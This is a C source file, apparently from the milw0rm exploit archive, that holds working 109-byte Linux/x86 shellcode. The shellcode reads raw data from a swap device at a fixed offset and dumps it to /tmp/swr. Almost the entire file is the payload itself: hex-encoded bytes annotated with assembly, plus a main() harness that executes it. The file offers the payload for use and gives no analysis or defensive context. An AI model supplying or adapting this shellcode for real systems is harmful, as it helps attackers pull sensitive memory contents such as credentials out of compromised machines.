/*
 * linux-x86-swap-restore.c - SWAP restore shellcode 109 bytes for Linux/x86
 * Copyright (c) 2006 Gotfault Security & rfdslabs
 *
 * Authors:
 *
 *      dx      <xgc@gotfault.net>
 *      spud    <gustavo@rfdslabs.com.br>
 *
 * This shellcode reads the swap device at offset 31337. After it searchs by
 * NULL byte, it stops and write the readed content to '/tmp/swr' file.
 * Probaly you needs to change the device path name in open() device syscall.
 *
 */

char shellcode[] =

  /* open(device, O_RDONLY) */

  "\x6a\x05"                    // push   $0x5
  "\x58"                        // pop    %eax
  "\x99"                        // cltd
  "\x52"                        // push   %edx
  "\x68\x73\x64\x61\x31"        // push   $0x31616473
  "\x68\x64\x65\x76\x2f"        // push   $0x2f766564
  "\x66\x68\x2f\x2f"            // pushw  $0x2f2f
  "\x89\xe3"                    // mov    %esp,%ebx
  "\x52"                        // push   %edx
  "\x59"                        // pop    %ecx
  "\xcd\x80"                    // int    $0x80

  "\x93"                        // xchg   %eax,%ebx

  /* lseek(fd_device, 31337, SEEK_SET) */

  "\x31\xc9"                    // xor    %ecx,%ecx
  "\x6a\x13"                    // push   $0x13
  "\x58"                        // pop    %eax
  "\x66\xb9\x69\x7a"            // mov    $0x7a69,%cx
  "\xcd\x80"                    // int    $0x80

  /* read(fd_device, *buf, 1025) */

  "\x89\xe1"                    // mov    %esp,%ecx
  "\x42"                        // inc    %edx
  "\xc1\xe2\x0a"                // shl    $0xa,%edx
  "\x42"                        // inc    %edx
  "\x6a\x03"                    // push   $0x3
  "\x58"                        // pop    %eax
  "\xcd\x80"                    // int    $0x80

  "\x89\xe6"                    // mov    %esp,%esi
  "\x99"                        // cltd
  "\x31\xff"                    // xor    %edi,%edi

  /* counter loop - read each byte and searchs by 0x0. */

  "\xac"                        // lods   %ds
  "\x38\xd0"                    // cmp    %dl,%al
  "\x74\x04"                    // je     80480b3 <close_device>
  "\x47"                        // inc    %edi
  "\xeb\xf8"                    // jmp    80480aa <counter>

  "\x91"                        // xchg   %eax,%ecx

  /* close(fd_device) */

  "\x6a\x06"                    // push   $0x6
  "\x58"                        // pop    %eax
  "\xcd\x80"                    // int    $0x80
  "\x89\xe6"                    // mov    %esp,%esi

  /* open("/tmp/swr", O_CREAT|O_APPEND|O_WRONLY) */

  "\x66\xb9\x41\x04"            // mov    $0x441,%cx
  "\x52"                        // push   %edx
  "\x68\x2f\x73\x77\x72"        // push   $0x7277732f
  "\x68\x2f\x74\x6d\x70"        // push   $0x706d742f
  "\x89\xe3"                    // mov    %esp,%ebx
  "\xb0\x05"                    // mov    $0x5,%al
  "\xcd\x80"                    // int    $0x80

  "\x93"                        // xchg   %eax,%ebx

  /* write(fd_filename, *buf, sizeof(buffer)) */

  "\x6a\x04"                    // push   $0x4
  "\x58"                        // pop    %eax
  "\x56"                        // push   %esi
  "\x59"                        // pop    %ecx
  "\x89\xfa"                    // mov    %edi,%edx
  "\xcd\x80"                    // int    $0x80

  /* close(fd_filename) */

  "\xb0\x06"                    // mov    $0x6,%al
  "\xcd\x80"                    // int    $0x80

  /* exit(anything) */

  "\xb0\x01"                    // mov    $0x1,%al
  "\xcd\x80"                    // int    $0x80
;

int main() {

        int (*f)() = (int(*)())shellcode;
        printf("Length: %u\n", strlen(shellcode));
        f();
}

// milw0rm.com [2006-04-16]